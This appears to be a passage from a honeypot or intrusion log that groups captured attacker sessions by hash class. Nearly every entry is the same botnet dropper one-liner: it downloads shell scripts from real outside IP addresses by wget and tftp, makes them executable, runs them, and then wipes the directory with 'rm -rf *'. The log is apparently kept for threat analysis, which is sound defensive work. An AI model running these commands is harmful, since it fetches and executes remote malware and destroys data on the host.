# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
# --- session 769d0b88404f | n_rows=1 | fi_hash=13d8841f330b058a ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
# --- session 8168a391afb7 | n_rows=1 | fi_hash=13d8841f330b058a ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
# --- session a0f08a3a7ae8 | n_rows=1 | fi_hash=13d8841f330b058a ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
# --- session af5f2a713ed0 | n_rows=1 | fi_hash=13d8841f330b058a ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
# --- session d603dc42b1d8 | n_rows=1 | fi_hash=13d8841f330b058a ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
# --- session ef27561c417e | n_rows=1 | fi_hash=13d8841f330b058a ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
# --- session f634b6203f88 | n_rows=1 | fi_hash=13d8841f330b058a ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
#
# ### FI class 160f60200a5f9040 — 169 sessions
# --- session 004724000d7b | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 0075b48830c4 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 0744fea7c440 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 083f4bd173a1 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 0852fb897d9f | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 09a46192793a | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 09a6da4ff1dc | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 0af1d63f58cb | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 0e03795fc7fd | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 0f7a6f12ea95 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 1001493d20f0 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 14662fc57570 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 157ec01e186e | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 15c4b80c5f9d | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 18b371f9ee39 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 19946592fc0b | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 1b8c57071a40 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://51.15.112.248/eskgbins.sh; chmod 777 eskgbins.sh; sh eskgbins.sh; tftp 51.15.112.248 -c get eskgtftp1.sh; chmod 777 eskgtftp1.sh; sh eskgtftp1.sh; tftp -r eskgtftp2.sh -g 51.15.112.248; chmod 777 eskgtftp2.sh; sh eskgtftp2.sh; rm -rf eskgbins.sh eskgtftp1.sh eskgtftp2.sh; rm -rf *
# --- session 1c184bec5009 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 1c222bf2dfa5 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 1daa6b696965 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 1efba50ba2bd | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 20345e01b1e1 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 203c48448076 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 2170eb0637e3 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 22040208adaa | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://108.174.198.111/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 108.174.198.111 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 108.174.198.111; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 23d8b1c4fcf7 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 24e9d7b9dad5 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 25bba4851242 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://193.111.78.190/billjenkinbins.sh; chmod 777 billjenkinbins.sh; sh billjenkinbins.sh; tftp 193.111.78.190 -c get billjenkintftp1.sh; chmod 777 billjenkintftp1.sh; sh billjenkintftp1.sh; tftp -r billjenkintftp2.sh -g 193.111.78.190; chmod 777 billjenkintftp2.sh; sh billjenkintftp2.sh; rm -rf billjenkinbins.sh billjenkintftp1.sh billjenkintftp2.sh; rm -rf *
# --- session 275f7e4b6f1b | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 2cad991a5ee9 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 2ec791408d67 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 300c9cf8a9b7 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 303d2b76ae87 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 30bc30ea3980 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 342661b5a712 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 3449bdc7ca65 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://109.206.241.200/arcbins.sh; chmod 777 arcbins.sh; sh arcbins.sh; tftp 109.206.241.200 -c get arctftp1.sh; chmod 777 arctftp1.sh; sh arctftp1.sh; tftp -r arctftp2.sh -g 109.206.241.200; chmod 777 arctftp2.sh; sh arctftp2.sh; rm -rf arcbins.sh arctftp1.sh arctftp2.sh; rm -rf *
# --- session 351482c11678 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 3928f3f2a318 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://108.174.198.111/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 108.174.198.111 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 108.174.198.111; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 3b0212fd6a60 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 3b56b7ced48c | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 3bcf64265ae7 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 3cc48a948065 | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 3ed2453b8b5e | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 3f9b8d15299a | n_rows=1 | fi_hash=160f60200a5f9040 ---
# cd /tmp || cd /run || cd /; wget http://23.254.247.214/Heisenbergbins.sh; chmod 777 Heisenbergbins.sh; sh Heisenbergbins.sh; tftp 23.254.247.214 -c get Heisenbergtftp1.sh; chmod 777 Heisenbergtftp1.sh; sh Heisenbergtftp1.sh; tftp -r Heisenbergtftp2.sh -g 23.254.247.214; chmod 777 Heisenbergtftp2.sh; sh Heisenbergtftp2.sh; rm -rf Heisenbergbins.sh Heisenbergtftp1.sh Heisenbergtftp2.sh; rm -rf *
# --- session 3fa8f0d0b357 | n_rows=1 | fi_hash=160f60200a5f9040 ---
